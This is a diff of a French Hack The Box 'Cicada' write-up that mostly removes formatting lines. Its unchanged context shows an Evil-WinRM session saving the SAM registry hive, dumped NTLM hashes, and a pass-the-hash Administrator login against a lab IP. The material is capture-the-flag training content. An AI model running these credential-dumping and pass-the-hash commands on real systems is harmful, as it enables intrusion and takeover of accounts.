@@ -24,11 +24,6 @@ cover:
   alt: "easy windows writeup"
   relative: false
 ---
-
-<div align="center">
-  <img src="/images/logos/cicada.png" alt="cicada HTB logo" width="150">
-</div>
-
 ![image](https://github.com/user-attachments/assets/1cf736dd-fac1-40c0-aba2-5c103d0076ca)
 
 ## Nmap Full Scan 
@@ -402,8 +397,6 @@ smb: \> ls
 ```
 
 Dans cet exemple, la commande a trouvé un fichier `Notice from HR.txt` dans le répertoire `HR` sur le serveur SMB.
-
-
 On y voit un mot de passe sans nom d'utilisateur
 
 ```bash
@@ -509,16 +502,10 @@ Pour la privesc je vous redirige vers ceci : https://www.hackingarticles.in/wind
 
 ```powershell
 Evil-WinRM* PS C:\Users\emily.oscars.CICADA> mkdir Temp
-
-
     Directory: C:\Users\emily.oscars.CICADA
-
-
 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
 d-----         1/26/2025  12:06 AM                Temp
-
-
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd Temp
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Temp> reg save hklm\sam C:\Users\emily.oscars.CICADA\Temp\sam
 The operation completed successfully.
@@ -552,8 +539,6 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
 ```
-
-
 ```
 ┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/Cicada]
 └─$ evil-winrm -i 10.10.11.35 -u Administrator -H '2b87e7c93axxxxxxxxxxxxxxxxxxxxxxx'
